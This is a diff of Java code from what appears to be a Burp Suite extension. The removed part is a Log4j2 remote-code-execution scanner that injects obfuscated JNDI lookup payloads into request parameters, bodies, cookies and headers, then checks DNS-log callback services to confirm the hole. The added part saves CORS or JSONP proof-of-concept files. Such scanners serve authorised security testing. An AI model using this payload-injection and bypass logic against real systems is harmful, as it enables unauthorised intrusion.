-            //firstheaders[1] 为请求的uri
-            //firstheaders[2] 为请求协议版本，不用看
-
-            /*****************获取body 方法一**********************/
-            if(!firstheaders[1].contains("?")) {  // 无参情况，直接在路径后面添加payload
-                firstheaders[1] = firstheaders[1] + "/" + vulnurl_param(vulnurl, param_i++, this.isipincreasing);
-            }
-
-            // 这里一直到POST的行，因为GET、POST、PUT等其他请求都可能请求的uri有参数
-            String[] requries = new String[0];
-            if (firstheaders[1].contains("?")) {
-                String[] requris = firstheaders[1].split("\\?",2);
-
-                if (requris.length > 1) {
-                    requries = requris[1].split("&");
-                    for (String uri_single : requries) {
-                        String[] uri_single_lists = uri_single.split("=");
-                        uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
-                    }
-                    uri_total = uri_total.substring(0, uri_total.length() - 1);
-                }
-                firstheaders[1] = requris[0] + "?" + uri_total;
-            }
-
-            if (!firstheaders[1].contains("/druid")) //apache druid 情况
+    public void onButton28Click(ActionEvent actionEvent) throws Exception {
+        String fileContent = mTextArea26.getText();
+        String filename = "";
+        if(mRadiobutton7.isSelected())  // 如果CORS选中
+            filename = "poc2jar-cors";
+        if(mRadiobutton8.isSelected())  // 如果JSONP选中
+            filename = "poc2jar-jsonp";
+        Stage stage=new Stage();
+        FileChooser fileChooser = new FileChooser();
+        fileChooser.getExtensionFilters().addAll(
+                new FileChooser.ExtensionFilter("HTML", "*.html"),
+                new FileChooser.ExtensionFilter("JavaScript", "*.js")
+        );
+        fileChooser.setInitialFileName(filename);
+        File file2 = fileChooser.showSaveDialog(stage);
+        fileChooser.setTitle("保存html文件");
+//        System.out.println(file2.getAbsolutePath());
+        if (file2 != null) {
+            if(!file2.exists())
             {
-                firstheaders[1] = firstheaders[1].replace("{", "%7b").replace("}", "%7d"); // 替换GET参数里的{和}
-            }
-
-            String request_header_content_type = "";
-            for ( int ii =0;ii <request_header.size() ;ii++) {
-                if (request_header.get(ii).contains("Content-Type") || request_header.get(ii).contains("content-type")){
-                    String[] request_header_content_types = request_header.get(ii).split(":");
-                    request_header_content_type = request_header_content_types[1];
+                try {
+                    file2.createNewFile();
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
             }
-
-            if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){
-
-                /**  .contains("=")    !.contains("{")
-                 * a=1&b=2&c=3
-                 */
-                if (body.contains("=") && !body.contains("{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")) {
-                    String body_total = "";
-                    String[] bodys_single = body.split("&");
-                    for(String body_single:bodys_single) {
-                        String[] body_single_lists = body_single.split("=");
-                        body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl, param_i++,this.isipincreasing) +  "&" ;
-                    }
-                    body_total = body_total.substring(0,body_total.length()-1);
-                    body =  body_total;
-                }
-
-                /** !.contains("=")    .contains("{")
-                 * {"a":"1","b":"22222"}
-                 */
-                else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                    JSONObject jsonObject = JSON.parseObject(body);
-                    for (String key:jsonObject.keySet()) {
-                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                    }
-                    body = jsonObject.toString();
-                }
-
-                /** .contains("=")    .contains("{")
-                 * a=1&param={"a":"1","b":"22222"}
-                 */
-                else if( body.contains("={") && body.contains("&") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                    String body_total = "";
-                    String[] bodys_single = body.split("&");
-                    for(String body_single:bodys_single) {
-                        if (body_single.contains("{")){
-                            String[] body_single_lists = body_single.split("=");
-                            JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
-                            for (String key:jsonObject.keySet()) {
-                                jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                            }
-                            body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
-                        }else {
-                            String[] body_single_lists = body_single.split("=");
-                            body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
-                        }
-                    }
-                    body_total = body_total.substring(0,body_total.length()-1);
-                    body =  body_total;
-                }
-
-                /**
-                 * body={"a":"1","b":"22222"}
-                 */
-                else if(body.contains("={") && !body.contains("&") && !body.contains("\":{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                    String body_total = "";
-                    if (body.contains("{")){
-                        String[] body_single_lists = body.split(body.split("=")[0] + "=");
-                        JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
-                        for (String key:jsonObject.keySet()) {
-                            jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                        }
-                        body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
-                    }else {
-                        String[] body_single_lists = body.split("=");
-                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) ;
-                    }
-                    body = body_total;
-                }
-
-                /**
-                 * body={"params":{"a":"1","b":"22222"}}
-                 */
-                else if (body.contains("={\"") && !body.contains("&") && body.contains("\":{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                    String body_code = body;
-                    body = body.split(body.split("=")[0] + "=")[1];
-
-                    JSONObject jsonObject = JSON.parseObject(body);
-                    for (String key:jsonObject.keySet()) {
-                        if (jsonObject.getString(key).contains("{")){
-                            JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
-                            for (String key2:jsonObject2.keySet())
-                                jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                            jsonObject.put(key,jsonObject2);
-                        } else
-                            jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                    }
-                    body = body_code.split("=")[0] + "=" + jsonObject.toString();
-                }
-                /** !.contains("&")    .contains("\":{")  !.contains("={")
-                 * {"params":{"a":"1","b":"22222"}}
-                 */
-                else if( body.contains("\":{") && !body.contains("={\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")) {
-                    JSONObject jsonObject = JSON.parseObject(body);
-                    for (String key:jsonObject.keySet()) {
-                        if (jsonObject.getString(key).contains("{")){
-                            JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
-                            for (String key2:jsonObject2.keySet())
-                                jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                            jsonObject.put(key,jsonObject2);
-                        } else
-                            jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                    }
-                    body = jsonObject.toString();
-                }
-                else if( request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("xml version") ||
-                        request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("!DOCTYPE") ||
-                        request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("%21DOCTYPE")) { // 增加xml格式识别
-                    try {
-                        body = java.net.URLDecoder.decode(body, "UTF-8");
-                    } catch (UnsupportedEncodingException e) {
-                        e.printStackTrace();
-                    }
-                    // 第一种情况
-                    // a=1&b=2&c=<?xml version=“1.0” encoding = “UTF-8”?>
-                    // <COM>
-                    //<REQ name="1111">
-                    //<USER_ID>yoyoketang</USER_ID>
-                    //<COMMODITY_ID>123456</COMMODITY_ID>
-                    //<SESSION_ID>absbnmasbnfmasbm1213</SESSION_ID>
-                    //</REQ>
-                    //</COM>&d=333
-                    if (body.contains("&")) {
-                        String body_total = "";
-                        String[] bodys_single = body.split("&");
-                        for (String body_single : bodys_single) {
-                            if (!body_single.contains("?xml")) {
-                                String[] body_single_lists = body_single.split("=");
-                                body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "&";
-                            } else {
-                                String[] body_single_lists = body_single.split("=");
-                                List<String> list = new ArrayList<String>();
-                                Pattern pattern = Pattern.compile(">(.*?)</");
-                                Matcher m = pattern.matcher(body_single_lists[1]);
-                                String single_xml = "";
-                                while (m.find()) {
-                                    list.add(m.group(1));
-//                        System.out.println(m.group(1));
-                                }
-                                for (String str : list) {
-                                    body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "</");
-                                }
-                                body_total = body_total + body_single_lists[0] + "=" + body_single_lists[1];
-                            }
-                        }
-                        body_total = body_total.substring(0, body_total.length() - 1);
-                        body = body_total;
-                    }
-                } else if (request_header_content_type.contains("text/xml")){
-                    // 第二种情况
-                    //<?xml version=“1.0” encoding = “UTF-8”?>
-                    // <COM>
-                    //<REQ name="111">
-                    //<USER_ID>yoyoketang</USER_ID>
-                    //<COMMODITY_ID>123456</COMMODITY_ID>
-                    //<SESSION_ID>absbnmasbnfmasbm1213</SESSION_ID>
-                    //</REQ>
-                    //</COM>
-                    List<String> list = new ArrayList<String>();
-                    Pattern pattern = Pattern.compile(">(.*?)</");
-                    Matcher m = pattern.matcher(body);
-
-                    while (m.find()) {
-                        list.add(m.group(1));
-//                        System.out.println(m.group(1));
-                    }
-                    for (String str: list){
-                        body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "</");
-                    }
-                }
-
-                else if( request_header_content_type.contains("multipart/form-data") ){
-                    // file文件格式 感觉没必要去考虑
-//                stdout.println("multipart");
-//                stdout.println(body);
-                    List<String> list_multipart = new ArrayList<String>();
-                    Pattern pattern = Pattern.compile("\n(.*?)\r\n--");
-                    Matcher m = pattern.matcher(body);
-                    while (m.find()) {
-                        list_multipart.add(m.group(1));
-//                        stdout.println(m.group(1));
-                    }
-                    for ( String str : list_multipart)
-                        body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "\r\n--");
-                }
-                body = body.replace("$","%24"); // 对请求体的{、}、$、/进行编码
-
+            try (FileWriter fileWriter = new FileWriter(file2.getAbsolutePath())) {
+                fileWriter.append(fileContent);
+            } catch (IOException e) {
+                e.printStackTrace();
             }
-
-            request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
-
-            // 去除源请求包里的Origin参数
-            /*****************增加header**********************/
-            List<String> xff_lists = Arrays.asList("X-Forwarded", "X-Forwarded-Host",
-                    "X-remote-IP","X-remote-addr","True-Client-IP","Client-IP","X-Real-IP",
-                    "Ali-CDN-Real-IP","Cdn-Src-Ip","Cdn-Real-Ip","CF-Connecting-IP","X-Cluster-Client-IP",
-                    "WL-Proxy-Client-IP", "Proxy-Client-IP","Fastly-Client-Ip","True-Client-Ip","X-Originating-IP",
-                    "X-Host","X-Custom-IP-Authorization","X-original-host");
-//            "X-Requested-With",,"X-forwarded-for"
-
-            StringBuilder cookie_total = new StringBuilder();
-            String lowup = "up"; // 默认Cookie为大写
-
-            for (int i = 0; i < request_header.size(); i++) {
-                if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
-                    if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
-                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-
-                if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-                }
-
-//                if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-//                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-//                }
-
-                // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
-                if (request_header.get(i).contains("Content-Type:") && this.isuseContenttype)
-//                    stdout.println(isuseRefererOrigin);
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"), param_i++,this.isipincreasing));
-
-                if ((request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:") ) && this.isuseRefererOrigin)
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-                if (request_header.get(i).contains("Accept-Language:") && this.isuseAccept)
-                    request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-                if (request_header.get(i).contains("Accept:") && this.isuseAccept)
-                    request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-                if (request_header.get(i).contains("Accept-Encoding:") && this.isuseAccept)
-                    request_header.set(i,request_header.get(i) + "," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-                if (request_header.get(i).contains("Origin:") && this.isuseRefererOrigin)
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-
-//                stdout.println("1197");
-//                stdout.println(request_header.get(0));
-
-//                for (String xff:xff_lists)
-//                    if (request_header.get(i).contains(xff + ":"))
-//                        request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-                if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
-                    if (request_header.get(i).contains("cookie:")) {
-                        lowup = "low";
-                    }else if (request_header.get(i).contains("Cookie:") ){
-                        lowup = "up";
-                    }
-                    if (this.isuseAllCookie) { // 对所有cookie发起请求
-//                        stdout.println("isuseallCookie为" + this.isuseAllCookie);
-                        String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
-                        String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
-                        for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
-                            String[] cookie_single_lists = cookie_single.split("=");
-                            cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl, param_i++,this.isipincreasing)).append("; ");
-                        }
-                        if (lowup.contains("up"))
-                            request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
-                        else
-                            request_header.set(i, "cookie:" + cookie_total); // cookie头增加
-                    }
-//                    else{ // 只对单条cookie发起请求
-//                        stdout.println("1219");
-//                        stdout.println(this.isuseAccept);
-
-                    //0.17.1更新，不对cookie发起请求
-//                        String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
-//                        String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
-//                        String[] cookie_single_0 = cookies_lists[0].split("=");
-//                        cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl, param_i++,this.isipincreasing);
-//                        for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
-//                            cookie_total.append(cookie_single).append("; ");
-//                        }
-//                        if (lowup.contains("up"))
-//                            request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
-//                        else
-//                            request_header.set(i, "cookie:" + cookie_total); // cookie头增加
-//                    }
-                }
-            }
-//            for (String xff:xff_lists)
-//                if (!request_header.contains(xff + ":") && this.isuseXfflists )  // 是否用xff列表测试，包含其他标识IP头
-//                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-//            stdout.println("1238");
-//            stdout.println(request_header.get(0));
-
-            if ( headers_lists.length > 0 && !headers_lists[0].equals("") ) { // 判断自定义参数不为空
-                for (String headers_host_single : headers_lists) // 白名单设置
-                {
-                    if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
-                        request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                }
-            }
-
-            if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
-                request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            // 如果没有参数，那么将不会测试
-//            if (!request_header.contains("Content-Type:") && this.isuseRefererOrigin)
-//                request_header.add( "Content-Type: text/plain;charset=UTF-8 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if ((!request_header.contains("Referer:") || !request_header.contains("referer:") ) && this.isuseRefererOrigin)
-//                request_header.add( "Referer: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept-Language:") && this.isuseAccept)
-//                request_header.add( "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept:") && this.isuseAccept)
-//                request_header.add( "Accept: */* " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept-Encoding:") && this.isuseAccept)
-//                request_header.add( "Accept-Encoding: gzip, deflate " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Origin:") && this.isuseRefererOrigin)
-//                request_header.add( "Origin: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            for (int j = 0; j < request_header.size() ; j++){
-                if (j != 0) {
-                    // 对payload进行优化，在测试某些系统中发现，$符号会造成请求不解析，具体可以在内网某远A8系统找到该类情况，但是由于在
-                    // 内网VMWARE测试发现，如果Content-type中的$进行url编码，会触发不了漏洞，故增加改动如下，正常uri请求中header携带
-                    // 的请求头中的$进行编码处理，payload的uri请求头中header携带的请求头中的$不进行编码处理
-                    code_headers.add(request_header.get(j));
-                }
-                else if(j == 0) {
-                    code_headers.add(firstrequest_header);
-                }
-            }
-
-            for (int j = 0; j < request_header.size() ; j++){
-                if (j != 0) {
-                    // 对payload进行优化，在测试某些系统中发现，$符号会造成请求不解析，具体可以在内网某远A8系统找到该类情况，但是由于在
-                    // 内网VMWARE测试发现，如果Content-type中的$进行url编码，会触发不了漏洞，故增加改动如下，正常uri请求中header携带
-                    // 的请求头中的$进行编码处理，payload的uri请求头中header携带的请求头中的$不进行编码处理
-                    code_headers2.add(request_header.get(j));
-                }
-                else if(j == 0) {
-                    code_headers2.add(firstrequest_header);
-                }
-            }
-
-            request_headers.add(request_header); // 将uri被payload化的请求加入待请求集
-            for (int jj = 0; jj < request_header.size() ; jj++){
-                request_header.set(jj, request_header.get(jj).replace("$","%24"));
-            }
-
-            if (!code_headers.get(0).equals(request_header.get(0))) // 如果uri payload化
-            {
-                request_headers.add(code_headers); // 将原请求添加到请求集
-                request_headers.add(code_headers2); // 将原请求2添加到请求集   正常uri，不进行$编码
-            }
-
-            // jndi_lists 参数bypass绕过列表
-            // request_bodys_lists 为请求体的列表
-            List<String> jndi_lists = Arrays.asList("jndi:","j$%7b::-n%7ddi:", "jn$%7benv::-%7ddi:","j$%7bsys:k5:-nD%7d$%7blower:i$%7bweb:k5:-:%7d%7d");
-//            List<String> jndi_lists = Arrays.asList("jndi:");
-//                    "j$%7b::-nD%7di$%7b::-:%7d", "j$%7bEnV:K5:-nD%7di:");
-
-            List<String> random_lists = new ArrayList();
-            for (int iji = 0 ;iji < jndi_lists.size(); iji ++  ) { // 根据bypass的个数生成随机字符串
-                random_lists.add(RandomStringUtils.randomAlphanumeric(3));
-            }
-
-            int ij_total = 0;
-            for (int iii = 0 ;iii < jndi_lists.size(); iii++ ) {
-                int ij = 1;
-            for(List<String> request_header_single:request_headers) { // 遍历[含有payload的uri]、[正常uri]的请求集
-                    if (iii == 0) {
-                        body = body.replace("%24", "$").replace(this.jndiparam.trim(), jndi_lists.get(iii)).replace(random_str,random_lists.get(iii));
-                        body = body.replace("$","%24");
-                        for (int jjj = 0; jjj < request_header_single.size(); jjj++) {
-                            request_header_single.set(jjj, request_header_single.get(jjj).replace("%24", "$").replace(this.jndiparam.trim(), jndi_lists.get(iii)).replace(random_str,random_lists.get(iii)));
-                            request_header_single.set(jjj, request_header_single.get(jjj).replace("$","%24"));
-                        }
-                    } else if(iii > 0) {
-                        body = body.replace("%24", "$").replace(jndi_lists.get(iii - 1), jndi_lists.get(iii)).replace(random_lists.get(iii - 1),random_lists.get(iii));
-                        body = body.replace("$","%24");
-                        for (int jjj2 = 0; jjj2 < request_header_single.size(); jjj2++) {
-                            request_header_single.set(jjj2, request_header_single.get(jjj2).replace("%24", "$").replace(jndi_lists.get(iii - 1), jndi_lists.get(iii)).replace(random_lists.get(iii - 1),random_lists.get(iii)));
-                            request_header_single.set(jjj2, request_header_single.get(jjj2).replace("$","%24"));
-                        }
-                    }
-
-
-                        if (ij == 1 && this.isipincreasing) { // payload化 uri
-                            if (ij_total == 3) { // 走完一个循环，使用1.1替换3.0
-                                body = body.replace("." + ij_total + "." + (iii-1) + "." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim());
-                                body = body.replace("%24", "$");
-                                for (int jji = 0; jji < request_header_single.size(); jji++) {
-                                    request_header_single.set(jji, request_header_single.get(jji).replace("." + (ij_total-2) + "." + (iii-1) + "." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim()));
-                                }
-                                ij_total = 0;
-                            } else{ // 第一个循环走这里，替换变成1.0
-                                body = body.replace("." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim());
-                                body = body.replace("%24", "$");
-                                for (int jji = 0; jji < request_header_single.size(); jji++) {
-                                    request_header_single.set(jji, request_header_single.get(jji).replace("." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim()));
-                                }
-                            }
-                        } else if (ij == 2 && this.isipincreasing) { // 正常uri $编码
-                            body = body.replace("$", "%24");
-                            body = body.replace(ij - 1 + "." + iii + "."  + this.logxn_dnslog.trim(), ij + "." + iii + "." + this.logxn_dnslog.trim());
-//                            stdout.println(request_header_single);
-                                for (int jji = 0; jji < request_header_single.size(); jji++) { // 如果2.0在，那么就用3.0替代，类似的，如果2.1在，那么就用3.1替代
-                                    if (request_header_single.get(jji).contains("." + ij + "." + (iii-1) + "." +this.logxn_dnslog.trim())) {
-                                        request_header_single.set(jji, request_header_single.get(jji).replace("." + ij + "." + (iii - 1) + "." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim()).replace("$", "%24"));
-                                    }else{ // 如果2.0不在，那么就直接原payload替换成2.0
-                                        request_header_single.set(jji, request_header_single.get(jji).replace(  "." + this.logxn_dnslog.trim(), "." + ij + "."+ iii +  "."  + this.logxn_dnslog.trim()).replace("$", "%24"));
-                                    }
-                                }
-
-//                            stdout.println(body);
-//                            stdout.println(request_header_single);
-//                            stdout.println("\n");
-                        } else if (ij == 3 && this.isipincreasing) { // 正常uri $不编码
-//                vulnurl = vulnurl.replace(ij - 1 +"." + this.logxn_dnslog, ij + "." + this.logxn_dnslog);
-                            body = body.replace(ij - 1 + "." + iii + "." + this.logxn_dnslog.trim(), ij + "."+ iii + "." + this.logxn_dnslog.trim()).replace("%24", "$");
-
-                            for (int jji = 0; jji < request_header_single.size(); jji++) {
-                                if (request_header_single.get(jji).contains("." + ij + "." + (iii-1) + "." +this.logxn_dnslog.trim())) {
-                                    request_header_single.set(jji, request_header_single.get(jji).replace("." + ij + "." + (iii - 1) + "." + this.logxn_dnslog.trim(), "." + ij + "." + iii + "." + this.logxn_dnslog.trim()).replace("%24", "$"));
-                                }else{// 如果3.0不在，那么就直接原payload替换成3.0
-                                    request_header_single.set(jji, request_header_single.get(jji).replace(  "." + this.logxn_dnslog.trim(), "." + ij + "."+ iii +  "."  + this.logxn_dnslog.trim()).replace("%24", "$"));
-                                }
-                            }
-                            body = body.replace("%24", "$");
-
-                            ij_total = 3;
-//                            stdout.println(body);
-//                            stdout.println(request_header_single);
-                        }
-
-
-                        String finalUri = uri;
-                        String finalPrivatednsResponseurl = privatednsResponseurl;
-                        String finalBody = body;
-
-                        byte[] request_bodys;
-                        byte[] newRequest;
-
-                        // code_body为正常请求体、finalBody为payload化的请求体
-                        if (ij == 2 && this.isipincreasing) {
-                            request_bodys = code_body.getBytes();  //String to byte[] 原始请求体
-                            newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
-
-                        }else if(ij == 3 && this.isipincreasing){
-                            request_bodys = finalBody.getBytes();  //String to byte[] 原始请求体
-                            newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
-                        }else{
-                            request_bodys = code_body.getBytes();  //String to byte[]
-                            newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
-                        }
-
-                        ij++;
-
-                        int finalParam_i = param_i;
-                        String finalHost = host;
-                        int finalIj = ij;
-//                    String finalRandom_str = random_str2;
-                    int finalIii = iii;
-                    new Thread() { // 由于createmenuitem不能进行创建buildHttpMessage，所以另起一个线程进行探测
-                            public void run() {
-
-                                IHttpRequestResponse newIHttpRequestResponse = BurpExtender.this.callbacks.makeHttpRequest(httpService, newRequest);
-                                byte[] response = newIHttpRequestResponse.getResponse();
-
-                                if (BurpExtender.this.logxn) { // logxn 的dnslog记录
-                                    String words_vuln = firstheaders[0].trim().toLowerCase() + "." + finalHost.trim() + finalUri.trim();
-                                    if (words_vuln.length() > 20)
-                                        words_vuln = words_vuln.substring(words_vuln.length() - 20);
-                                    OkHttpClient client = new OkHttpClient();
-                                    String indexUrl = "https://log.xn--9tr.com/" + BurpExtender.this.logxn_dnslog_token.trim();
-//                stdout.println(indexUrl);
-                                    Request loginReq = new Request.Builder()
-                                            .url(indexUrl)
-                                            .get()
-                                            .build();
-                                    try {
-                                        Robot r = new Robot();
-                                        r.delay(2500);
-                                    } catch (AWTException ee) {
-                                        ee.printStackTrace();
-                                    }
-                                    Call call = client.newCall(loginReq);
-
-                                    Response response2 = null;
-                                    try {
-                                        response2 = call.execute();
-                                    } catch (IOException e) {
-                                        e.printStackTrace();
-                                    }
-                                    try {
-                                        assert response2 != null;
-                                        String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
-
-                                        if (respCookie.contains(words_vuln) && respCookie.contains( (finalIj - 1) + "." + finalIii + "." + logxn_dnslog.trim()) ) {
-                                            // 0.17.2更新参数点显示
-                                            String param_vuln = "";
-                                            for (int param_vuln_i = finalParam_i - 1; param_vuln_i >= 0; param_vuln_i--) {
-                                                if (respCookie.contains("\"" + param_vuln_i + "." + firstheaders[0].trim().toLowerCase())) {
-                                                    param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                                                }
-                                            }
-                                            synchronized (BurpExtender.this.Udatas) {
-//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
-                                                int row = BurpExtender.this.Udatas.size();
-                                                BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(), BurpExtender.this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                                                fireTableRowsInserted(row, row);
-                                                List<IScanIssue> issues = new ArrayList(1);
-                                                issues.add(new CustomScanIssue(
-                                                        httpService,
-                                                        url,
-                                                        new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                                        "log4j2 RCE",
-                                                        "log4j2 RCE" + param_vuln,
-                                                        "High"
-                                                ));
-//                                return issues;
-                                            }
-                                        }
-                                    } catch (IOException e) {
-                                        e.printStackTrace();
-                                    }
-                                }
-
-                                if (BurpExtender.this.ceyeio) { // ceye 的dnslog记录
-                                    String words_vuln = firstheaders[0].trim().toLowerCase() + "." + finalHost.trim() + finalUri.trim();
-//                                    if (words_vuln.length() > 20)
-//                                        words_vuln = words_vuln.substring(words_vuln.length() - 20);
-//                stdout.println(firstheaders[0].trim() + "." + host + uri);
-                                    OkHttpClient client = new OkHttpClient();
-                                    String indexUrl = "http://api.ceye.io/v1/records?token=" + BurpExtender.this.ceyetoken.trim() + "&type=dns&filter=";
-                                    Request loginReq = new Request.Builder()
-                                            .url(indexUrl)
-                                            .get()
-                                            .build();
-                                    try {
-                                        Robot r = new Robot();
-                                        r.delay(2500);
-                                    } catch (AWTException e) {
-                                        e.printStackTrace();
-                                    }
-                                    Call call = client.newCall(loginReq);
-
-                                    Response response2 = null;
-                                    try {
-                                        response2 = call.execute();
-                                    } catch (IOException ee) {
-                                        ee.printStackTrace();
-                                    }
-                                    try {
-                                        assert response2 != null;
-                                        String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
-//                    stdout.println(respCookie);
-                                        String param_vuln = "";
-                                        if (respCookie.contains(words_vuln) && respCookie.contains(finalIj - 1 + "."  + finalIii + "."  + logxn_dnslog.trim())) {
-                                            // 0.17.2更新参数点显示
-                                            for (int param_vuln_i = finalParam_i - 1; param_vuln_i >= 0; param_vuln_i--) {
-//                                        stdout.println(param_vuln_i);
-                                                if (respCookie.contains("\"" + param_vuln_i + "." + firstheaders[0].trim().toLowerCase())) {
-                                                    param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                                                }
-                                            }
-                                            synchronized (BurpExtender.this.Udatas) {
-//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
-                                                int row = BurpExtender.this.Udatas.size();
-                                                BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(), BurpExtender.this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                                                fireTableRowsInserted(row, row);
-                                                List<IScanIssue> issues = new ArrayList(1);
-                                                issues.add(new CustomScanIssue(
-                                                        httpService,
-                                                        url,
-                                                        new IHttpRequestResponse[]{newIHttpRequestResponse},
